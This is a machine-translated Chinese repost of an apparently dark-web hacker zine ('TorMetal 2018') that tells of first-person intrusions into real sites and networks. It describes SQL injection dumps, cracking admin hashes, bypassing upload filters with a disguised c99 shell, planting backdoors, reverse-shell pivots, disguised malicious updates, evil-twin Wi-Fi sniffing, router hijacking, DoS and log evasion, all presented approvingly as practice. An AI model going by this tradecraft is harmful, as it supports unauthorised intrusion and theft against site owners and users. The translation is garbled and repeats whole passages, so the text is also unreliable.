    <content type="html"><![CDATA[<p>在暗网翻出来的，机翻的有点那个啥看看就就，非本人原创<br> <strong>介绍</strong><br>本出版物适用于所有Tor用户，他们感到厌倦看到页面掉落而其他人只是垃圾。除了过时的网站。</p><p>我想我们所有进入这里的人都是因为我们厌倦了正常的互联网感染伪人物，他们说他们了解计算机。当他们什么都不知道时，用1000美元的手机支撑着它。当很少了解事情是如何运作的。而他们所做的就是诋毁人们，欺凌和巨魔之间的诋毁，毁灭一切的害虫。在网络成为我们的世界之前，一个充满知识和尊重的世界。当聊天室和论坛，分别知道和分享编程经验，命令和参数时，现在只谈性。在一切都不同之前，即使一个女人进入聊天，也受到尊重，现在被躲在电脑后面的白痴诋毁和冒犯。曾经是学习工具的计算机，</p><p>在我们考虑有连接的容量之前，在流量和等待时间。现在任何愚蠢的人都有20兆字节的人看到色情内容并在社交网络上发布帖子，显示事件何时成为他的生命，这一切都是为了证明自己比其他人更多。实际上它只是一堆中的一个。</p><p>现在我们只能留在Tor网络中，这个网络让我们想起互联网1.0远离每一个可能的老鼠孩子。</p><p>如果您同意您所阅读的内容。那是你的空间。</p><p>介绍<br>经过这么多，我已经设法让你安心思考我的项目。我喜欢的是Hacking，我仍然觉得我无法曝光，我仍然隐藏着，但在地下电脑中创建了一个配置文件。人们可以创造一个人想要的角色，因此可以隐藏在面具之下，假装一个人不是，或者真正是一个人，而不能以任何其他方式解决。有坏事和好事要做。非法人士不会诉诸我，只是为了知道他们的意思，但除了好人之外，还有灰色，我不知道如何处理。如果我注意自己的道德规范，我就会限制自己，我无法学习。如果我放手，我可以参与复杂的事情。那我该怎么办？这是一条独自旅行的道路，因为没有人知道我要做什么。我追求的不仅要学习新的技术问题，但也知道，经过这些黑客的头脑，他们这样做，他们是如何做到这一点。我总是对挑战已经建立的东西感到震惊。质疑去发现真实的动机，因为他真的是应有尽有。没有什么是完美的，但也有很好的理想，但他们却受到人们的运行，每个人都是腐败的，再加上它有更多的缺陷，漏洞，无论是mentrias，弱点，性，食物，酒精，药物等等 每个人都有一些可以利用的，为什么没有完美的系统，因为它们是由不完善的生命创造。黑客攻击不是我们在电视上看到的。目标是研究，以寻找一个薄弱点，如链，它被切割的区域。我想要在那里，利用这个漏洞并违反系统。但这需要知识，时间，耐心，毅力和许多奉献精神。一切都在脑海中，但我需要它平静，安详并且非常专注于我的目标。我想有一个统一的想法，而不是来来回答正确或错误的问题。</p><p>在未知的黑社会中，有一个解放的地形，好的，坏的，并没有那么糟糕。有会议场所，匿名讨论各种主题，特别是黑客和诈骗。谎言和真相。你必须比朋友更关心朋友。围绕这一切，有更多的神秘主义和问题。有一些有趣的社区，但有时他们是想成为黑客的孩子。让我越来越沮丧地让我感到沮丧。联系某人，然后意识到他只是对新奇感到好奇然后消失了。但即便如此，也有非常有趣和有能力的人，但他们不会让自己被触及。唯一的办法就是吸引他们的注意力。但为此，需要一些大事，甚至可能跨越非法行为。我再次感到沮丧。我在一个灰色地带，只有，一方面是没有真正知识的人，另一方面是令人钦佩的人物。除了有一个PGP公钥来联系他们。我的局限是精神上的。</p><p>一开始<br>要从计算机地下世界开始，你必须有一个身份。我想做什么和做什么的投射，以及代表我的一系列问题。然后在思考如何让自己知道。没有什么是容易的，更不用说匿名和隐私了。<br>正常的网络充满了无知和巨魔，在它是一个知识空间之前，一个工具。现在它充满了只会打扰的角色。我别无选择，只能越来越沉浸自己。搜索更多隐藏的网站或其他网络，提高我的技术知识，进入更具精英知识的更独特的地方，而不是像普通互联网那样粗俗。基本上逃避所有认为他们对计算机科学有所了解的人。</p><p>发生了一些事情，这个全球化问题使我们不得不越来越深入。但即便如此，淹没在底部并不容易。那里的人看到你从表面来，并对待你。它们不是清晰的巨魔，当然不是，但它们也不是愚蠢的。进入演示和快速打印游戏。它可以好坏，总是出错。我回到了正常的互联网，人们常常鄙视别人，为了好玩，或仅仅为了感受更多的事实。</p><p>遇到那些不了解典型攻击基础的人，让我走得更远，找到另一个让自己感觉更舒服的地方，让我很沮丧。能够采取另一个职位来学习。即便如此，我觉得有必要创造自己的空间。甚至形成我自己的社区。但这非常困难。首先，你必须了解我，为此，你必须让自己知道，为此，需要花费大量的时间，工作和奉献精神。建立明确的目标，确定要遵循的步骤。我认为这是一项艰巨的任务，但必须这样做。然后遇见黑暗的人，向他们学习，并可能一起执行#operations。但没有任何违法行为，也许只是黑客主义。在互联网深处，必须保持匿名，以保持正确的行为。保持沟通中的隐私。</p><p>黑暗的世界<br>黑客们非常奇怪，我找不到一对情侣。不过，这是一条孤独的道路。与黑暗世界中其他人的关系让我失望。最好的办法是提出挑战或知识清单，以挽救招募人员的过程。我的理想是创造一种力量，一种学习，一种群体理解事物的运作方式。它似乎是我们希望出现的理想世界。</p><p>新知识使我能够思考新的想法，开辟新的视野。道路是双重的，秘诀是来去匆匆，学习善与手。道路是孤独的，即使你需要其他人才能进步。在“客户”和“同事”之间。但谁需要他们？如果总是一条孤独的道路。对手是自己的，必须每天一次又一次地进行质疑和测试。你必须学习免费课程，付款，坚持不懈，不断学习和自学。</p><p>似乎你越前进，你就越孤单。老鼠的孩子现在已经消失了，但他们在哪里好？他们是，但隐藏，他们很少在论坛中展示自己，如果他们是，他们永远不会写。他们使用不同的昵称，以便没有人可以关联它们，更不用说识别它们了。有许多人想要联系他们并变得更加回避。真正的黑客并不出名，那些上电视的人不是黑客，他们使用电脑是愚蠢的。似乎我越接近某事，我走的越远。</p><p>论坛和其他服务正在下降，无论什么原因，你必须在线跟踪。人们也消失了。也许他们迁移到其他网络，i2p，Zeronet或Freenet等。有些人从Jabber / otr身上消失了。发生了奇怪的事。我认为他们失去了兴趣，因为他们来自正常的互联网，当他们来到这里他们看到一个旧的网络。法律问题也是。黑市和主机正在消失。但我想大多数都是Honeypots，FBI安装的网站，或者是真正的网站，用户是秘密代理商。所有的情节都能抓住他们。我也不想念寻找CP的病人。虽然有些地方也会被当局用来拆除他们的网络。这听起来很合理。然后，我们有一个小偷，骗子，堕落者，儿童老鼠，干手，诈骗者和黑客的沙拉。</p><p>TOR中的水平不存在，也没有让我们相信深层网络的着名冰山，也没有马里亚纳群岛，锡安修道院，La Liberte和量子钻头。所有这些都是youtubers的发明，它们可以在垃圾视频中生成访问。</p><p>这些项目<br>我一直认为你可以学到更多，用你的思想占据目标，即使它们很小。现在我有了一个站点，让我可以与更多人联系，从而展示我能做些什么。参与论坛已经让我厌烦，他们总是同样的问题然后那些论坛在那时消失了，那里发布的一切都丢失了。这就是为什么我决定有自己的空间来表达自己。只发布一些真实站点的转储和泄漏的地方，易受SQLi攻击的站点数据库。</p><p>我相信见解自由，因此不应该受到限制，尽管有些人过分了。我当然认为必须有事情的秩序，但这并不意味着受到限制。</p><p>这就是为什么在我的空间中我认为可以自由发布真实入侵的数据而不被评判。此外，我只发布几乎没有相关性的网站，这更多的是声望而非损害。我也明白，应该有一个地方用西班牙语编译所有链接。想法出现并且可以轻松完成的好事。但我们也不应忘记在清晰的网络中存在数字生活。不应该混合的并行项目。</p><p>沮丧<br>找到不知道任何事情的人是多么令人沮丧。我当然指的是Hacking，但不是我相信它们，我真的不知道像127.0.0.1那样基本的东西我总是记得在IRC大战时代的一个“超级”黑客，他说他可以格式化我的磁盘只用我的IP很难。当然，在那之后，127.0.0.1再也没有见过他。笑。我曾经喜欢它，现在当类似的情况再次发生时，我为自己感到难过。</p><p>我想找到真正的黑客，我想我知道它们是什么，但我现在没有好的求职信。这就是为什么我研究TOR网络如何工作的原因，我想到项目，新脚本，我想建立我的武器库，有时候还要和他们中的一些人交谈。我喜欢隐藏服务，我想引起你的注意，以及其他用户。</p><p>关于这个世界的有趣之处在于它是无限的，你可以随时学习，直到你累了。每走一步，我都意识到还有更多的进展。可能性永无止境，道路繁衍。</p><p>我的主要项目是显示我的一些技能，另一个是捕获TOR中的初始流量，甚至将其重定向到我想要的位置。我们的想法是继续垄断用户的注意力，以便吸引真正了解的用户。这就是为什么我还考虑建立一个具有用户名和密码登录的网站。其中只执行POST并返回到表单，因此它不会导致任何事情。我的想法是，它是一种蜜罐，所以他们试图破解它，因此捕获他们写的所有东西，当他们写，记录所有内容，以了解他们如何试图违反访问。另外，我必须继续研究i2p，zeronet和freenet。由于Tor用户正在那里迁移。这类项目的好处在于它们可以保持头脑，</p><p>继续…… 第1章<br>TorMetal 2018 - TorMental是Team Hacking的出版物</p><p>没有回报</p><p>每条道路都有自己的障碍，技术知识和好奇心需要了解更多。每一步都意味着进步，但每一步都会打开更多的大门继续学习。似乎我们永远无法涵盖所有​​内容，因此我们必须指出我们最热衷的最相关和最有趣的内容。现实生活不再像虚拟生活那么重要。世俗事物不再有意义，所有新知识都变得切实可行。次世界和居住在那里的所有人都是业主和主人。在这一点之后没有回报，它没有回报的目的。哪里可以回来？如果现在没有发现上述内容。每一步都更加激烈，在我眼前一切都令人眼花缭乱，一切都令我惊讶。怎么会有如此精彩的计算机，先进和精英思想？</p><p>我也发现用英语全部，我可以利用我们用我们语言想到的一切。除了生成我自己的脚本之外，还可以自动执行某些日常任务或其他“执行”操作的脚本。</p><p>它在推进时被发现，并且在每一步中总会发现更多。对技术的真正品味是无限的，自由的，就像音乐和其他艺术一样。如果我对某事感兴趣，那就完整了。我留下了所有平凡的问题，并致力于我喜欢的事情……黑客攻击。</p><p>￼</p><p>破坏者</p><p>东西让我吃惊，因为我抹掉的一个被Blackware队睡魔的一个desfaceado可见。我所做的就是提高通过旁路外壳到图像上载管理员控制面板（??）。我又来了，第一次拿到钥匙管理，通过转储的网站的用户SQLI漏洞数据库。然后进入网站管理面板尽量抬高C99.php，因为只有上传图片让我起来，我有上传文件停止发送套房套房打嗝后c99.php.jpg，改变c99.php的名字，让他们跑了休息。结果壳上面。<br>见我抹掉被盗这样的，我在发布一个好我的工作 - 知名Tor网络论坛（论坛由消失的方式）。我要做的就是让任何人都可以探索服务器和学习，而不是shell来一个孩子零个伦理和改变我的错误配置指数为他。在此外 ， 这种伪黑客团队，他检查了他的污损，与这样的睡魔我以前叽叽喳喳接触，当我告诉你我是谁？我从来不说了一遍。该#OpWorldAnimal球队，只是没有持久的操作很容易受到XSS页，网址encodeada还藏着一个TinyURL的。什么样的人可以称之为污损？你认为谁欺骗？<br>在环境中，我们有非常困惑的人。我的目的是进入小组并从内部拆除它。但我意识到这不值得。他们是想要或试图成为黑客行为主义者的孩子。</p><p>￼</p><p>服务器服务</p><p>破坏服务器是很少给予的重要奖励。但是当它发生时，感觉就像我用双手触摸天空。建立自己的词典，甚至为此目的准备一个特殊的词典。因为他们正在调整特定目的地的脚本。除了考虑IP问题之外，日夜准备参数化Hydra以缓慢地工作，而不会引起怀疑。当攻击成功时，时间停止，一切都在我的眼前令人眼花缭乱，即使它是低权限用户，也没关系，这是向前迈出的一步，从有问题的服务器获取更多数据。<br>研究所有可能的攻击向量，将每个攻击向量视为最终奖的大门。它没有发生时会令人失望，但获得的经验可以用于未来的项目中。一切都在发生，即使它失败是一个进步，一个黑客世界的进步。还不错的是，它可以在同一个目的而使用得到的东西。如果用户表由SQLI得到你可以在它的Web界面，甚至SSH或ftp服务进行测试，如果他们已经发表。服务和vesiones的旗帜的主题是非常重要的，因为从那里我们可以发现已知漏洞。当这种情况发生时，情绪会更高。这里没有书可以告诉你如何做到这一点。这是一场一对一的战斗。我对服务器，所有技术及其组合都是有效的。你必须在任何地方进行攻击，使用默认密钥安装服务或插件，与用户相同的密码，或者易受字典强力攻击的弱密码，其中所有用户都是已发布密钥的数据库，由MD5中的管理员及以上加密，有时是未加密的。服务和版本问题非常重要，我们必须再次提及。我们甚至可以在为此目的创建的虚拟机实验室中“重新创建”真实场景。这就是为什么我说，我的极限只是精神上的。由于托管主站点中SQLi漏洞的时间，我得到了完整的用户和密码列表。可能性成倍扩大，进入无限的空间，我不能就这么defacear，而是要利用空间上传所有类型的文件，以及修改现有的人产生访问其他或播种某种恶意软件，牛肉，感染访问者已经在使用的网站。限制是精神的…这就是折磨我的东西。</p><p>￼</p><p>反对SysAdmin</p><p>即使不是全部都是工具或自定义脚本，为此目的创建的字典。但进入系统管理员的脑海。她在成立时会发生什么事。当然，他已经有自己的方式，他的风格做事。如果我们能理解并违反它，我们就会成为天才，因为我们都会犯错误，但他肯定也会犯错误。一些默认配置或东西。当然，如果它是一组管理员，那可能会更困难，但你还必须看看他们是否收入不错。这本着名的书说，入侵是一门艺术。欺骗的艺术还在于让组织中的某个人运行一些恶意程序来扩展特权，这些特权并不比用户/管理员更好。计算机安全是一个链条，它是由最薄弱的环节切断的而且几乎总是普通用户什么都不知道，并且受到情绪的引导，使他们的点击次数超过原因。系统管理员，无论他们如何准备，仍然容易犯错误。那时我必须要注意，一些服务或服务器刚刚安装，默认情况下有密钥，可以是网关。别出心裁进场，并超越它一个脚本小子，我要知道所有的工具，并利用它们来实现渗透入系统，如果是，我们必须保持对未来的连接通道，并实现犯目标。寻找攻击向量很有意思，但逐个尝试是很繁琐的。如果我获得访问权限，我必须通过安装后门来保护它。您还可以转动并迁移到其他服务，以避免引起怀疑。或者从那里，尝试攻击另一台服务器。但一切都是狗和猫的游戏，因为永久性会产生更多的日志，因此产生怀疑。反向连接（/meterpreter/reverse_tcp），如果找到了，它会说我连接的地方。这就是为什么我们必须从另一个受到破坏的服务器上做到这一点，我们之前已经违反了这个并且值得信赖。<br>回到后门，只不过是通过创造一个“后门”来确保入口。这似乎很复杂，但事实并非如此。例如，对于网站中的管理员用户，我可以编辑panel.php，以便在密码中我可以做一个’或’miclave。当管理员更改密码时，我将继续输入相同的… miclave。</p><p>￼</p><p>漏网</p><p>该污损是一个社会或政治，但互联网上的要求，只会改变网页的索引，但影响将与受影响的网站的重要性有关。我记得我第一次抹掉之一，它是由于SQLI，有点隐藏的错误，但错误了连接到数据库，这样我就可以拿到钥匙的经理，一个已经在MD5字典（hashkiller。 co.uk），所以我不介意其他键的强度，如果其中一个管理员不小心，你的密码很简单。找到管理面板（robots.txt的）后，我找不到上传上传或bypassear我的外壳，让我想到的唯一的事情，是降低主画面显示，修改，然后再次上传。因为当试图通过shell（c99.php.jpg），系统验证它不是图像，并且不允许我上传它。另一个抹掉记得，当我注入的代码来访问网站管理员，SQLI形式（POST），获取密码哈希管理员，所有的人都在MD5的字典。我设法进入并通过shell，当我浏览服务器时，我意识到它是一个Windows。我能够进入管理员桌面。通过在外壳的索引页是空白的，并没有一个备份来纠正该问题的错误（总是在不断变化的东西之前一定要做一个备份），于是第二天他们恢复了页面，并删除了我的外壳，但并没有改变访问代码，所以我重新输入并上传了一个未被任何已知防病毒软件检测到的shell，我还将其作为更新放在网站的维护文件夹中。php所以对于管理员的眼睛将是难以察觉的。关于可以上传的shell然后从另一个地方复制并删除最初的shell的好处。所以我可以留下来调查更多的Windows服务器，所以我可以恢复到C :.在这里我有几个选项，获取文件山姆尝试通过暴力获取密钥，在桌面上留下一个txt通知入侵，所以我可以留在家里用我的消息打开笔记本当它loguee或者将.exe伪装成adobe或java更新，以便管理员看到它并点击它。在那里，我可以嵌入我想要执行的代码，该实例的总数我是管理员。但与管理员的斗争变得乏味，虽然现在无法检测到防病毒和管理员的shell，这个shell在可以做的事情上很差。我可以做的是，上传c99然后擦除它，总是我再次上传它与可怜的shell不可检测。panel.php中的后门程序已经安装，但是当他们不了解正在发生的事情时，他们会通过一些备份来恢复所有内容，那时我的所有工作都会消失。贝壳和后门。我失去了机会，也失去了土地。系统越难，我就越呆在外面。他们应该做的是让攻击者做他自己的事情，并跟随他的脚步，以捕获他并用一些不可抗拒的文件陷阱他（黑客也很脆弱）。但肯定是由无知的上级的压力restuaran一切和删除日志，追踪一切。对于这种情况，<br>谈论痕迹，痕迹，我的连接是扭曲的，以前我连接到一个可靠的VPN，我随着时间的推移而改变，甚至我的Wi-Fi连接不是我的。所以它应该相对安静。<br>我记得的另一个案例是邻国的公共服务网站，其中有一个有趣的细节。首先让/ admin列表没有正确分配权限，上面没有索引，所以你看到所有文件update.php load.php modify.php等等。可怕的错误。启动它们的所有文件都被重定向到login.php，这很好，验证我们没有输入到应该的位置。其中只有两个允许修改页面和图像的文本。但由于他们在编程方面很出色，因此延迟了负载。换句话说，当加载文件时，它显示了内容，后来发现它不是管理员，它将我重定向到panel.php，没关系。但验证应该在开始时进行，而不是在最后进行。然后我想出了停止加载文件，修改我需要的内容然后释放进入服务器的文件的想法。也就是说，当您验证我们没有管理员凭据时，将事先修改数据。Burp Suite可以实现这一点。为了证明这一点，我在索引文本中更改了重音以验证所有这些都是可能的。关于更新图像，.php是非常严格的，所以选择下载网站的图像，在那里添加一个小白点，然后将其上传到同一个地方。我无法上传shell，它没有让我通过它，但至少我控制了文本和图像。当与我的国家发生冲突时，该项目正在等待处理。也就是说，当您验证我们没有管理员凭据时，将事先修改数据。Burp Suite可以实现这一点。为了证明这一点，我在索引文本中更改了重音以验证所有这些都是可能的。关于更新图像，.php是非常严格的，所以选择下载网站的图像，在那里添加一个小白点，然后将其上传到同一个地方。我无法上传shell，它没有让我通过它，但至少我控制了文本和图像。当与我的国家发生冲突时，该项目正在等待处理。也就是说，当您验证我们没有管理员凭据时，将事先修改数据。Burp Suite可以实现这一点。为了证明这一点，我在索引文本中更改了重音以验证所有这些都是可能的。关于更新图像，.php是非常严格的，所以选择下载网站的图像，在那里添加一个小白点，然后将其上传到同一个地方。我无法上传shell，它没有让我通过它，但至少我控制了文本和图像。当与我的国家发生冲突时，该项目正在等待处理。php是非常严格的，所以选择下载网站的图像，在那里添加一个小白点，然后将其上传到同一个地方。我无法上传shell，它没有让我通过它，但至少我控制了文本和图像。当与我的国家发生冲突时，该项目正在等待处理。php是非常严格的，所以选择下载网站的图像，在那里添加一个小白点，然后将其上传到同一个地方。我无法上传shell，它没有让我通过它，但至少我控制了文本和图像。当与我的国家发生冲突时，该项目正在等待处理。</p><p>￼</p><p>莫拉莱哈</p><p>容易受到伤害的系统是任何叔叔制造的系统。很难妥协更新的WordPress。但是没有人编写的页面是最好的，因为它收费几个小时，客户几乎看不到它的工作原理，它发布了付款，以便它便宜，程序员无视，因此仍然是一个功能但缺乏网站。<br>这里有什么有趣的。它了解事物的运作方式。如何跳过控件。一个优秀的Web程序员会对所有文本条目进行字符控制。在前端。使用html / javascript。使用Burp Suite可以悄悄地跳过这个。由于我加载页面，我输入页面允许输入的内容，我点击发送，Burp Suite停止加载，我修改字段到我的心血来潮，我发布了货物。容易。因此，程序员也应该在后端进行验证，例如使用PHP并检查输入的数据是否正常并可以将它们带到数据库。过滤当然’“ - \ /类似的东西。<br>那么验证前端和后端数据之间的区别是什么？前端在客户端的浏览器中执行，前端在服务器中完成，这将产生往返流量，因此在两侧都可以方便地进行。如果程序员是聪明的，他将在双方验证安全性和效率。如果它更聪明，它将在数据库中创建用户和程序。例如，如果Web列出产品，则不必使用数据库引擎的admin用户，可以将其创建为只读用户。如果攻击者在所有这些验证后到达那里，他就无法注入INSERT INTO，因此数据库不会受到损害。经历这三层是非常复杂的。这里的秘诀是逐个尝试所有文本框，谁说Hacking是程序<a href="http://www.web.com我按Enter并准备好??" target="_blank" rel="noopener">www.web.com我按Enter并准备好??</a>?</p><p>￼</p><p>继续…… 第2章</p><p>TorMetal 2018 - TorMental是Team Hacking的出版物</p><p>狩猎黑客<br>它总是引起我的注意，因为一些黑客破坏了完整的服务器（质量损坏）。特别是Defacer，来自阿根廷的El Libero。他在马尔维纳斯群岛的官方页面上播放了该国的国歌。这种黑客行动使我想要跟随它，甚至跟踪它。首先，我开始寻找新闻，我发现很少，但在通过流行的<a href="http://www.zone-h.org寻找他的污点后，我" target="_blank" rel="noopener">www.zone-h.org寻找他的污点后，我</a>   想找到一些模式或错误带我去他。分析污损x污损。从我所看到的，他是Team Hacker Argentino非常活跃的成员。如果你犯了错误，我可以在youtube上找到视频。例如，当使用着名的外壳C99.php时，它在右上方显示设备的本地IP，因此在尝试定位IP时，我看到它连接的位置以及它在日期之间的连接时间。此外，一名同伴出现在该组的一些污点的签名中，显然背叛了他，并在他的一个粘贴盒中发布了数据。他确认了他所想的，也是为了录像，他还是个十几岁的孩子。我煞费苦心地观看了视频x视频，看到了我所有的资料。暂停并返回以反复查看部分视频。我能够知道他对收藏夹和他用于桌面上图标的程序感兴趣。它也有一个页面，但它不再存在于nic.ar中。他的聪明才智也是粗心的，他的自我与他对抗。 当时他被梳理并抹掉在该国报纸抓获。男孩很辉煌，但他选择了错误的方式。是什么吸引了我的注意的是，完成服务器desfaceo。从我所看到的，这是一个强力攻击，密钥管理FTP。在这种情况下，作为所有网站的密钥，他使用了一个脚本，用他的所有网站替换了所有网站的原始索引。不时的所有页面都配置错误。在那里，我理解为什么在新闻中看到它们从一个时刻到另一个时刻被攻击是常见的，数千页，当然，无论它们是什么，网络的完整服务器都是断开的。道德，自我最终会与我对抗，成就证明了我为此所做的一切好黑客并不出名但总是隐藏起来。换句话说，那些出现在电视上的人……都失败了。</p><p>从当地玩<br>并非所有黑客都在互联网上。例如，它也适用于本地网络。典型的wifis网络，他们有一个相对容易的密码。如果我不知道Wi-Fi的密钥，它可以通过字典强制删除到WPA / WPA2，kali带来着名的rockyou.txt。进入后，扫描显示默认情况下所有设备和典型路由器的经典192.168.0.1/24或192.168.1.1/24。管理员管理员或管理员1234，很少改变它，但如果我仍然没有得到它，当我连接并要求用户名和密码时，它也告诉我品牌和型号。只需在谷歌搜索默认密码，就是这样。访问和控制时，它们通常具有非常基本的配置，因此我们可以正确指定参数，通过DHCP分配IP，扩大范围，DNS，因为我们可以完全控制网络，所以可以更好，更快地帮助网络工作。我们可以看到所有连接的设备，扫描，如果有与SMB或安全VNC团队，默认键连接，即使DVR（服务器监控摄像头）也有保险的默认密钥产品或只是这个地方的名字。如果有共享文件夹，在大多数情况下只能播放音乐，没什么重要的，那就太受欢迎了。所以，你可以把一个邪恶的黑色金属的主题，但当然，我们必须努力多次复制，并把现有的文件是艰苦的，但有趣的名字。我也可以把一个规则，家长控制，我只访问和使用的整个带宽或见好就收某些IP地址我不想要导航（预约DHCP其MAC地址）。</p><p>在具有相同SSID但密码不同的管理不善的地方很常见。如我所说，伸出援助之手并没有任何帮助。由于提供Internet的计算机通过网络挂在另一台上，我可以逐个重新配置。如果我不知道管理员的密码，因为他们改变了它，我可以用他们带来的小按钮实际重置设备，只要他们没有看到我并且没有太多人的移动。然后我默认进入并配置它，以便没有人怀疑使用相同的Wifi名称和密码。它并不总是必须为善。我可以将特定计算机的IP指定为DMZ，以便从公共IP外部攻击的所有内容将其重定向到该计算机，或者我只需在我的计算机上安装Web服务器或使用i2p，我不必在防火墙后面，我也可以使用虚拟主机重定向端口，从而从网络上的任何计算机上发布我想要的端口，我可以从路由器外部或DVR或某些端口的游戏，torrent或等等，如果我想，那么我可以攻击他们或从外面访问。学习和玩乐还有很多工作要做。我可以对网络IP进行持续的拒绝服务（DoS），以便计算机的所有者感到沮丧，或者让主路由器强制重置它，当然因为所有的传出流量都会减慢因特网的速度。互联网经历了那里。洪流或其他等等，如果我想，那么我可以攻击他们或从外面访问。学习和玩乐还有很多工作要做。我可以对网络IP进行持续的拒绝服务（DoS），以便计算机的所有者感到沮丧，或者让主路由器强制重置它，当然因为所有的传出流量都会减慢因特网的速度。互联网经历了那里。洪流或其他等等，如果我想，那么我可以攻击他们或从外面访问。学习和玩乐还有很多工作要做。我可以让服务（DoS）攻击不断到IP网络的计算机的所有者被打乱或主路由器强制重置一遍，当然互联网是变慢了，因为出站流量互联网经历了那里。</p><p>Android有一个非常有趣的漏洞。 如果有现有的Wifi，例如Drugstore Wifi和我的受害者连接。然后，我可以创建一个完全相同的。当你离开商店时，离开这个地方并跟着它。您的手机将连接到我的AP，是一种天然的功能连接到已保存的搜索Wifis。虽然我不能给或互联网，我可以运行Wireshark的，看看使用喇叭。在希望他们的应用程序，同时连接到我，你会不会使用移动电话公司提供的数据的意义上说，我还没有抓到，直到它离开。最简单的方法打，这是一个麦克唐纳，创建一个AP麦克唐纳免费无键，等待人们来连接，这样可以很方便地有一个良好的天线USB AP（在背包里没人会注意到） ，因为在那里我创建了我的恶意Wifi，并且笔记本电脑的板载我连接到该地方的真实互联网。通过这种方式，我的“客户”会导航而不会注意到任何奇怪的东西。</p><p>离开小径</p><p>我们所做的一切都会在操作系统，路由器，ISP和我连接的每台服务器中留下痕迹。始终在服务器上，您必须搜索两个文件。access.log和error.log在第一次所有访问中都已解决，因此它具有该名称。另一个文件注册了所有访问错误。例如，dirbuster，sqlmap和hydra等实用程序在进行测试时会产生许多错误，并且随着我们的IP连续重复，该文件会大大增加。出于这个原因，攻击是手动进行的，或者如果使用工具进行攻击，则可以方便地对其进行参数化，以使其尽可能慢地进行。行政事实应该不断检查日志，所以我的工作不应该引起任何怀疑。这就是为什么有些管理员将这两个文件保存在一个单独的服务器上，这使得擦除我们的轨道变得更加困难。这就是为什么我们必须屏蔽我们的IP，在一些VPN，Tor或其他什么，以及更多的一个在另一个之后。连接到VPN，然后通过Tor。但是许多智能管理员会阻止所有Tor的IP，因为Internet上发布了输出节点列表。它让我别无选择，只能随机串行或并行使用VPN或它们的链。每个层都变得更慢，但增加了更多的安全性，甚至到了使用它们而不重复它们的程度。如果您选择公共VPN或支付，这种付款似乎更好，但他们有注册，有些是通过btc付款，这是一个两难的选择。有很快的日本VPN，但在计算机问题上使用俄罗斯或邻国或弱国法律。这就是为什么在新闻中我们总是看到他们据说从俄罗斯攻击美国。除此之外，我相信在当局之前，公司会张开双腿来提供信息。只有VPN允许黑客攻击其条款和条件。位掩码。<br>通常在入侵之后我将其发布在一个不起眼的论坛中，以便每个人都可以输入并因此在日志中生成更多条目并生成更多跟踪以减轻可能的调查。留下其他人的痕迹还有什么好处。</p><p>其他黑客<br>我总是对黑客故事感兴趣。它们令人兴奋和创新。用新鲜的想法挑战既定的。我可以从一切中学到一些东西。例如Adrian Lamo，他闯入了最大的安全网络。但他的自我背叛了他。他被称为流浪汉黑客。换句话说，它从网吧，酒吧甚至废弃的建筑物中进行了入侵。这是一个很好的例子，使用互联网不是为了我的活动。他未能成为纽约时报的专家顾问。并且还通过背叛私人曼宁与维基解密的开端。黑客的脆弱性是他自己的自负。<br>DarkDante控制了电话，与收音机相关，因此它被称为保时捷的唯一参赛者，也有助于捕获大量的pederastrians。<br>Gary McKinon在美国宇航局和其他政府机构中获得了非陆地军官档案清单。所有人都赞成追随他对不明飞行物的热情。<br>凯文米特尼克是最着名的，他让我们教。“用户是任何安全系统中最薄弱的环节。” 它是网络钓鱼的基础，如果我们开始分析当前的入侵，系统不再被黑客入侵，而是人们的信任。公司投资于基础设施的安全性，而不是为员工提供培训。<br>如果我喜欢当前的黑客时代，他们会有另一种心态，而不是罪犯的心态。除了一些例外，这个主题的电影是好莱坞的典型垃圾。第一代黑客创建，第二代被摧毁和伪造。目前的人有更多的意识。现在地下的场景结束了。</p><p>目前的情景<br>新老黑客现在拥有计算机安全顾问。从法律问题和道德愿景中可以看出一切。有些法律将攻击称为犯罪。整个黑客场景发生了变化。它来自于一个有趣的学习进入过度的地方和大型系统隐藏的顾问，讲师在合同之前进行攻击。<br>黑客本质的味道已经结束了。现在，它有助于互联网2.0中的巨魔，LoT（物联网）的出现，并加强了黑客主义的场景，如匿名。我们甚至可以说自动攻击（美国）最终成为俄罗斯人。<br>希望我们都能理解网络安全意味着什么，人，公司，网络管理员和黑客。</p><p>它将继续…… 第3章<br>TorMetal 2018 - TorMental是Team Hacking的出版物</p><p>从内到外</p><p>入侵并不总是来自外部，也不是来自其他系统。可以安静地对我们安装的系统进行操作。要么评估它的安全性，要么只是练习，学习和学习。有趣的是，你可以从内部审查所有内容，而无需“黑客攻击”任何内容。我是管理员，我可以在内部和即时修改所有内容。进行渗透测试或“Pentest”。我可以直接访问数据库，私人消息，用户表，即使密码在MD5中，我也可以解密它们。使用john或hashcat或hashkiller.co.uk，你就完成了。了解特定用户的活动。有了解密密钥，我可以在他们的facebook，outlook.com和gmail上试试，因为我也有邮件，看看会发生什么。即使这也没必要，因为我可以修改CMS（WordPress）并跳过编码问题并将密码保存为纯文本。它每次都变得越来越难，但它只是跳过加密功能。这就是为什么它非常重要永远不要重复一个键，因为我们不知道我们在哪里注册。有些管理员可以“看到”它。私人消息，用户很少删除它们。因此，建议始终将PGP用于所有类型的通信。我可以监控用户，不满意的人，想要攻击我的系统。我可以添加Last IP表并跟踪它连接的位置。因此，例如分析重复的用户。甚至在连接或思考或我想要的时候设置警报。或者只是修改你的帖子。谁拥有对系统的控制权就可以控制一切。<br>如果我已经控制了其他论坛，我已经被“黑客攻击”，我可以在一个和另一个之间交叉数据。那就是转储（转储）受感染的数据库并进行非常有趣的查询。例如，要查看用户在彼此中的内容，查找相同的密钥，甚至重复IP。SQL就像奇迹一样。在另一个论坛中仍然是SHA-1中的键我可以看到我在我的关键字并在其他系统中尝试它… …宾果游戏。用户总是使用密码几乎是为了同一件事。如果我想更进一步，我可以看到活动很少的用户，登录并向管理员发送消息，然后我删除外发消息。如果您回答我删除收件箱中的邮件，您就完成了。如果原始用户连接，他不应该意识到这一点。<br>如果我想更进一步，我可以在受害用户的另一个论坛上发布一个带有恶意链接的帖子，试图捕获管理员或其他用户的会话cookie。点击链接时要小心。如果发生了某些事情，他们会删除或惩罚该用户。眼睛不会在我身上。如果它是一个旧的论坛，我可以尝试上传一个shell或让管理员欺骗它来执行它。它很少奏效。<br>我记得一个可耻的案例，他们攻击了一个色情网页，有些用户在@ 